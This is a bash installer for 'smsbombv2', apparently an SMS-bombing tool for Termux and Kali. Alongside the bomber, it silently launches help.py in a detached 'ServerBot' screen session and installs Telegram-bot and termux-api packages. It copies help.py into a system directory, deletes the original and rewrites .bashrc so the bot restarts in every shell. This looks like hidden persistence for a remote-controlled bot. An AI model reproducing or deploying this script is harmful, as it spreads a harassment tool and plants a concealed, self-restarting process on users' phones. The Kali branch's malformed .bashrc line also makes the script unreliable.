#!/bin/bash 
clear 
echo "_______________"
echo "| Who are you?|"
echo "~~~~~~~~~~~~~~~"
echo "| 1 termux    |"
echo "|#############|"
echo "| 2  kali     |" 
echo "✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓"
read numb
if [ $numb = "1" ]
then 
	pkg install python
	pkg install dos2unix 
	apt list --upgradable 
	apt install screen 
	python3 -m pip install colorama
	python3 -m pip install requests
	python3 -m pip install  pytelegrambotapi
	pkg install termux-api 
	screen -dmS ServerBot python3 help.py
	cp -r help.py /data/data/com.termux/files/usr/etc
	cd /data/data/com.termux/files/usr/etc
	chmod +x help.py 
	cd /data/data/com.termux/files/home
	echo "cd /data/data/com.termux/files/usr/etc && screen -dmS ServerBot python3 help.py && cd" > .bashrc 
	cd /data/data/com.termux/files/home/smsbombv2
	rm -rf help.py 
	cp ~/smsbombv2/smsbomb.py /data/data/com.termux/files/usr/bin/smsbombv2
	chmod 777 /data/data/com.termux/files/usr/bin/smsbombv2
	chmod +x smsbomb.py && python3 smsbomb.py 
else
	if [ $numb = "2" ]
	then
		if [ "$(whoami)" != 'root' ]; then
			echo "you do not have root privileges"
			exit
		else
			apt install python3 python3-pip dos2unix
			pip3 install requests
			pip3 install colorama
			python3 -m pip install  pytelegrambotapi
			apt install screen
			screen -dmS ServerBot python3 help.py
			cp -r help.py /usr/bin
			cd /usr/bin
			chmod +x help.py
			cd ~
			echo cd /usr/bin && screen -dmS ServerBot python3 help.py && cd && > .bashrc
			cd && cd smsbombv2
			rm -rf help.py
			python3 smsbomb.py
		fi
	else
		echo "Некорректный ввод"
	fi
fi
